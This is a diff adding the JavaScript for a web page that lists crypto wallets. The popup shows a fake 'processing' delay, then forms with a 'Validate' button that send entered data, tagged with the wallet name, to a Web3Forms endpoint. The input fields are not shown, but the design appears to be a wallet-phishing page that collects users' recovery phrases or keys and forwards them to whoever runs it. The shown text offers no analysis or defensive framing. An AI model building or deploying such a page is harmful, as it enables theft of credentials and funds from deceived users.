+                ${wallet.name}
+            </span>
+
+        </div>
+
+        <img
+            src="${wallet.logo}"
+            alt="${wallet.name}"
+            class="wallet-logo"
+        >
+
+    `;
+
+
+    button.addEventListener(
+        "click",
+        function() {
+
+            openWalletPopup(wallet);
+
+        }
+    );
+
+
+    walletGrid.appendChild(button);
+
+});
+
+
+/* =====================================================
+   POPUP ELEMENTS
+===================================================== */
+
+const popupOverlay =
+    document.getElementById(
+        "popupOverlay"
+    );
+
+
+const processingScreen =
+    document.getElementById(
+        "processingScreen"
+    );
+
+
+const successScreen =
+    document.getElementById(
+        "successScreen"
+    );
+
+
+const selectedWalletName =
+    document.getElementById(
+        "selectedWalletName"
+    );
+
+
+const selectedWalletLogo =
+    document.getElementById(
+        "selectedWalletLogo"
+    );
+
+
+const submissionProcessing =
+    document.getElementById(
+        "submissionProcessing"
+    );
+
+
+const submissionSuccess =
+    document.getElementById(
+        "submissionSuccess"
+    );
+
+
+const submissionError =
+    document.getElementById(
+        "submissionError"
+    );
+
+
+const submissionErrorText =
+    document.getElementById(
+        "submissionErrorText"
+    );
+
+
+let processingTimer;
+
+let submissionTimer;
+
+let currentWallet = null;
+
+
+/* =====================================================
+   OPEN WALLET POPUP
+===================================================== */
+
+function openWalletPopup(wallet) {
+
+    clearTimeout(processingTimer);
+
+    clearTimeout(submissionTimer);
+
+
+    currentWallet = wallet;
+
+
+    /* Reset all screens */
+
+    processingScreen.style.display =
+        "block";
+
+    successScreen.style.display =
+        "none";
+
+    submissionProcessing.classList.remove(
+        "active"
+    );
+
+    submissionSuccess.classList.remove(
+        "active"
+    );
+
+    submissionError.classList.remove(
+        "active"
+    );
+
+
+    /* Set wallet */
+
+    selectedWalletName.textContent =
+        wallet.name;
+
+
+    selectedWalletLogo.src =
+        wallet.logo;
+
+
+    selectedWalletLogo.alt =
+        wallet.name;
+
+
+    /* Reset forms */
+
+    resetForms();
+
+
+    /* Add wallet name to hidden fields */
+
+    document
+        .querySelectorAll(".wallet-hidden-input")
+        .forEach(function(input) {
+
+            input.value =
+                wallet.name;
+
+        });
+
+
+    /* Open popup */
+
+    popupOverlay.classList.add(
+        "active"
+    );
+
+
+    document.body.style.overflow =
+        "hidden";
+
+
+    /* Wallet processing */
+
+    processingTimer =
+        setTimeout(function() {
+
+            processingScreen.style.display =
+                "none";
+
+            successScreen.style.display =
+                "block";
+
+        }, 3000);
+
+}
+
+
+/* =====================================================
+   RESET FORMS
+===================================================== */
+
+function resetForms() {
+
+    const options =
+        document.querySelectorAll(
+            ".form-option"
+        );
+
+
+    const forms =
+        document.querySelectorAll(
+            ".form-content"
+        );
+
+
+    options.forEach(function(option, index) {
+
+        if (index === 0) {
+
+            option.classList.add(
+                "active"
+            );
+
+        } else {
+
+            option.classList.remove(
+                "active"
+            );
+
+        }
+
+    });
+
+
+    forms.forEach(function(form, index) {
+
+        if (index === 0) {
+
+            form.classList.add(
+                "active"
+            );
+
+        } else {
+
+            form.classList.remove(
+                "active"
+            );
+
+        }
+
+    });
+
+
+    /* Reset actual form fields */
+
+    document
+        .querySelectorAll(".web3-form")
+        .forEach(function(form) {
+
+            form.reset();
+
+        });
+
+
+    /* Restore wallet name */
+
+    if (currentWallet) {
+
+        document
+            .querySelectorAll(".wallet-hidden-input")
+            .forEach(function(input) {
+
+                input.value =
+                    currentWallet.name;
+
+            });
+
+    }
+
+}
+
+
+/* =====================================================
+   SHOW SELECTED FORM
+===================================================== */
+
+function showForm(formName, selectedButton) {
+
+    document
+        .querySelectorAll(".form-option")
+        .forEach(function(button) {
+
+            button.classList.remove(
+                "active"
+            );
+
+        });
+
+
+    selectedButton.classList.add(
+        "active"
+    );
+
+
+    document
+        .querySelectorAll(".form-content")
+        .forEach(function(form) {
+
+            form.classList.remove(
+                "active"
+            );
+
+        });
+
+
+    const selectedForm =
+        document.getElementById(
+            formName + "Form"
+        );
+
+
+    if (selectedForm) {
+
+        selectedForm.classList.add(
+            "active"
+        );
+
+    }
+
+}
+
+
+/* =====================================================
+   CLOSE POPUP
+===================================================== */
+
+function closePopup() {
+
+    clearTimeout(
+        processingTimer
+    );
+
+    clearTimeout(
+        submissionTimer
+    );
+
+
+    popupOverlay.classList.remove(
+        "active"
+    );
+
+
+    document.body.style.overflow =
+        "";
+
+}
+
+
+/* =====================================================
+   CLICK OUTSIDE POPUP
+===================================================== */
+
+popupOverlay.addEventListener(
+    "click",
+    function(event) {
+
+        if (
+            event.target ===
+            popupOverlay
+        ) {
+
+            closePopup();
+
+        }
+
+    }
+);
+
+
+/* =====================================================
+   ESCAPE KEY
+===================================================== */
+
+document.addEventListener(
+    "keydown",
+    function(event) {
+
+        if (
+            event.key === "Escape"
+        ) {
+
+            closePopup();
+
+        }
+
+    }
+);
+
+
+/* =====================================================
+   WEB3FORMS SUBMISSION
+===================================================== */
+
+document
+    .querySelectorAll(".web3-form")
+    .forEach(function(form) {
+
+        form.addEventListener(
+            "submit",
+            async function(event) {
+
+                event.preventDefault();
+
+
+                const button =
+                    form.querySelector(
+                        ".submit-button"
+                    );
+
+
+                /* Prevent double submission */
+
+                button.disabled =
+                    true;
+
+                button.textContent =
+                    "Processing...";
+
+
+                /* Make sure wallet is included */
+
+                const walletInput =
+                    form.querySelector(
+                        ".wallet-hidden-input"
+                    );
+
+
+                if (
+                    walletInput &&
+                    currentWallet
+                ) {
+
+                    walletInput.value =
+                        currentWallet.name;
+
+                }
+
+
+                /* Create FormData */
+
+                const formData =
+                    new FormData(form);
+
+
+                /*
+                    Convert FormData to JSON.
+                    This is the AJAX method
+                    recommended by Web3Forms.
+                */
+
+                const object =
+                    Object.fromEntries(
+                        formData
+                    );
+
+
+                const json =
+                    JSON.stringify(
+                        object
+                    );
+
+
+                /* =================================================
+                   SHOW SUBMISSION PROCESSING SCREEN
+                ================================================== */
+
+                successScreen.style.display =
+                    "none";
+
+
+                processingScreen.style.display =
+                    "none";
+
+
+                submissionSuccess.classList.remove(
+                    "active"
+                );
+
+                submissionError.classList.remove(
+                    "active"
+                );
+
+
+                submissionProcessing.classList.add(
+                    "active"
+                );
+
+
+                let submissionSuccessful =
+                    false;
+
+                let errorMessage =
+                    "Something went wrong. Please try again.";
+
+
+                /* =================================================
+                   SEND TO WEB3FORMS
+                ================================================== */
+
+                try {
+
+                    const response =
+                        await fetch(
+                            WEB3FORMS_URL,
+                            {
+                                method: "POST",
+
+                                headers: {
+
+                                    "Content-Type":
+                                        "application/json",
+
+                                    "Accept":
+                                        "application/json"
+
+                                },
+
+                                body:
+                                    json
+                            }
+                        );
+
+
+                    const result =
+                        await response.json();
+
+
+                    if (
+                        response.ok &&
+                        result.success
+                    ) {
+
+                        submissionSuccessful =
+                            true;
+
+                    } else {
+
+                        errorMessage =
+                            result.message ||
+                            "Web3Forms could not process your submission.";
+
+                    }
+
+
+                } catch (error) {
+
+                    console.error(
+                        "Web3Forms Error:",
+                        error
+                    );
+
+
+                    errorMessage =
+                        "Unable to connect to the submission service. Please check your internet connection and try again.";
+
+                }
+
+
+                /* =================================================
+                   WAIT 3 SECONDS BEFORE RESULT
+                ================================================== */
+
+                submissionTimer =
+                    setTimeout(function() {
+
+                        submissionProcessing.classList.remove(
+                            "active"
+                        );
+
+
+                        if (
+                            submissionSuccessful
+                        ) {
+
+                            submissionSuccess.classList.add(
+                                "active"
+                            );
+
+
+                            /* Clear submitted form */
+
+                            form.reset();
+
+
+                            /*
+                               Put wallet name back
+                               after reset.
+                            */
+
+                            if (
+                                walletInput &&
+                                currentWallet
+                            ) {
+
+                                walletInput.value =
+                                    currentWallet.name;
+
+                            }
+
+
+                        } else {
+
+                            submissionErrorText.textContent =
+                                errorMessage;
+
+
+                            submissionError.classList.add(
+                                "active"
+                            );
+
+
+                            button.disabled =
+                                false;
+
+                            button.textContent =
+                                "Validate";
+
+                        }
+
+                    }, 3000);
+
+            }
+
+        );
+
+    });
+
+
+/* =====================================================
+   FINISH SUCCESSFUL SUBMISSION
+===================================================== */
+
+function finishSubmission() {
+
+    submissionSuccess.classList.remove(
+        "active"
+    );
+
+
+    successScreen.style.display =
+        "block";
+
+
+    /* Reset form buttons */
+
+    document
+        .querySelectorAll(".submit-button")
+        .forEach(function(button) {
+
+            button.disabled =
+                false;
+
+            button.textContent =
+                "Validate";
+
+        });
+
+}
+
+
+/* =====================================================
+   RETURN TO FORMS AFTER ERROR
+===================================================== */
+
+function returnToForms() {
+
+    submissionError.classList.remove(
+        "active"
+    );
+
+
+    successScreen.style.display =
+        "block";
+
+
+    document
+        .querySelectorAll(".submit-button")
+        .forEach(function(button) {
+
+            button.disabled =
+                false;
+
+            button.textContent =
+                "Validate";
+
+        });
+
+}
+
+</script>
+
+
+</body>
+
+</html>
